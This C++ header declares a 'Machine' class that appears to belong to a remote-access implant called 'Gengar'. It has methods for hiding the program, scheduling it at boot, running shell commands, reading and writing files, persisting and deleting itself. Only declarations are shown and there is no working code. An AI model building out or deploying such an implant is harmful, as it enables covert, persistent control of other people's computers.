#pragma once

class Machine
{
private:
	void MoveGengarToHiddenPath();
	void ScheduleGengarOnBoot();
	void DeleteGengar();
	void DeleteGengarSchedule();

public:
	Machine();
	std::string RunShellCommand(std::string);
	void WriteFile(std::string data, std::string path);
	std::string ReadFile(std::string path);
	void Persist();
	void Suicide();
};
